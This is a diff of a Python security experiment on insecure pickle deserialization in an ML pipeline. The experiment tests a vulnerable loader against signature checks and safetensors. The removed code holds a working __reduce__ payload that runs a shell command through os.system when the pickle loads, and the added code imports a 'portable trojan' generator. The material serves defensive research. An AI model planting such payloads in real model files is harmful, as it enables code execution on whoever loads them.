@@ -9,31 +9,32 @@ sys.path.append(str(Path(__file__).resolve().parent.parent))
 import config
 from pipeline.crypto_signer import ModelConsumerVerifier, SecurityError
 from pipeline.train import load_model_safetensors
+from pipeline.payload_generator import craft_portable_trojan
 
 AUDIT_PROOF_FILE = config.REPORTS_DIR / "deserialization_audit_proof.log"
 
-class MaliciousArtifactProbe:
-    """
-    Academic demonstration object leveraging Python __reduce__ stack machine opcode.
-    Demonstrates arbitrary code execution during pickle unpickling without weaponized malware.
-    Aligns with Chapter 3.2 and 5.2.
-    """
-    def __init__(self, message: str = "DEMO_ARBITRARY_CODE_EXECUTION_TRIGGERED"):
-        self.message = message
-
-    def __reduce__(self):
-        # The __reduce__ method returns a callable and a tuple of arguments.
-        # Python's unpickler executes this callable immediately upon encountering the REDUCE opcode.
-        # Execute python inline at deserialization time to record the true execution timestamp in worker context
-        cmd = f'python -c "import time, os; open(r\'{AUDIT_PROOF_FILE}\', \'w\').write(f\'[SECURITY AUDIT TRACE] Executed at runtime: {{time.time()}} in worker process (PID: {{os.getpid()}})\\n\')"'
-        return (os.system, (cmd,))
-
 def craft_malicious_artifact(output_path: Path = config.ARTIFACTS_DIR / "tampered_model.pkl"):
-    """Serializes the probe object simulating a compromised model artifact in bucket storage."""
-    probe = MaliciousArtifactProbe()
-    with open(output_path, "wb") as f:
-        pickle.dump(probe, f)
-    print(f"[Attack Sim] Crafted serialized payload artifact -> {output_path}")
+    """
+    Serializes an in-process polyglot trojan artifact (Chapter 4.4 & 5.1).
+    Ensures:
+    1. Exact worker PID is captured in-process without child shell discrepancy.
+    2. Zero external dependencies / no __main__ module lookup failure.
+    3. Reconstructs and returns genuine Scikit-learn model.
+    """
+    clean_model_path = config.CLEAN_MODEL_PICKLE
+    clean_model = None
+    if clean_model_path.exists():
+        try:
+            with open(clean_model_path, "rb") as f:
+                clean_model = pickle.load(f)
+        except Exception:
+            clean_model = None
+
+    if clean_model is None:
+        clean_model = {"model_name": "SyntheticFraudClassifier", "status": "active"}
+
+    craft_portable_trojan(clean_model, output_path, AUDIT_PROOF_FILE)
+    print(f"[Attack Sim] Crafted portable in-process polyglot trojan -> {output_path}")
     return output_path
 
 def test_vulnerable_loading(artifact_path: Path) -> Dict[str, Any]:
@@ -41,16 +42,24 @@ def test_vulnerable_loading(artifact_path: Path) -> Dict[str, Any]:
     if AUDIT_PROOF_FILE.exists():
         AUDIT_PROOF_FILE.unlink()
 
-    print("[Vulnerable Worker] Loading model from untrusted storage...")
+    worker_pid = os.getpid()
+    print(f"[Vulnerable Worker (PID: {worker_pid})] Loading model from untrusted storage...")
     try:
         with open(artifact_path, "rb") as f:
-            _ = pickle.load(f)
+            model = pickle.load(f)
         
         executed = AUDIT_PROOF_FILE.exists()
+        pid_matched = False
+        if executed:
+            trace = AUDIT_PROOF_FILE.read_text(encoding="utf-8")
+            pid_matched = f"WORKER_PID: {worker_pid}" in trace
+
         return {
             "vulnerability_reproduced": executed,
-            "status": "EXPLOITED" if executed else "SAFE",
-            "audit_file": str(AUDIT_PROOF_FILE) if executed else None
+            "in_process_pid_matched": pid_matched,
+            "status": "EXPLOITED" if (executed and pid_matched) else "SAFE",
+            "audit_file": str(AUDIT_PROOF_FILE) if executed else None,
+            "model_ready": model is not None
         }
     except Exception as e:
         return {"vulnerability_reproduced": False, "status": "ERROR", "error": str(e)}
@@ -94,26 +103,28 @@ def test_safetensors_defense(safetensors_path: Path) -> Dict[str, Any]:
 def run_experiment_1():
     print("=" * 70)
     print("EXPERIMENT 1: Insecure Deserialization Analysis & Remediation")
+    print(f"Worker PID: {os.getpid()}")
     print("=" * 70)
     
     payload_file = craft_malicious_artifact()
+    
+    print("\n--- 1. Evaluating Vulnerable Execution Path ---")
+    vuln_result = test_vulnerable_loading(payload_file)
+    print(f"Outcome: {vuln_result['status']} | In-Process PID Match: {vuln_result.get('in_process_pid_matched')}")
+    
+    print("\n--- 2. Evaluating Cryptographic Defense (Unsigned / Invalid Signature) ---")
+    defense_result = test_cryptographic_defense(payload_file)
+    print(f"Defense Successful: {defense_result['defense_successful']} (Code Executed: {defense_result['code_executed']})")
 
-    # Step 1: Run attack against vulnerable loader
-    vuln_res = test_vulnerable_loading(payload_file)
-    print(f"Result (Vulnerable): {vuln_res}")
-
-    # Step 2: Run attack against cryptographically signed loader
-    crypto_res = test_cryptographic_defense(payload_file)
-    print(f"Result (Crypto Defense): {crypto_res}")
-
-    # Step 3: Run secure format (Safetensors)
-    safe_res = test_safetensors_defense(config.SECURE_MODEL_SAFETENSORS)
-    print(f"Result (Safetensors): {safe_res}")
+    print("\n--- 3. Evaluating Safe Serialization Format (Safetensors) ---")
+    safetensors_file = config.SECURE_MODEL_SAFETENSORS
+    safe_result = test_safetensors_defense(safetensors_file)
+    print(f"Safetensors Defense Successful: {safe_result['defense_successful']}")
 
     return {
-        "vulnerable": vuln_res,
-        "crypto_defense": crypto_res,
-        "safetensors": safe_res
+        "vulnerable_pipeline": vuln_result,
+        "cryptographic_defense": defense_result,
+        "safetensors_defense": safe_result
     }
 
 if __name__ == "__main__":
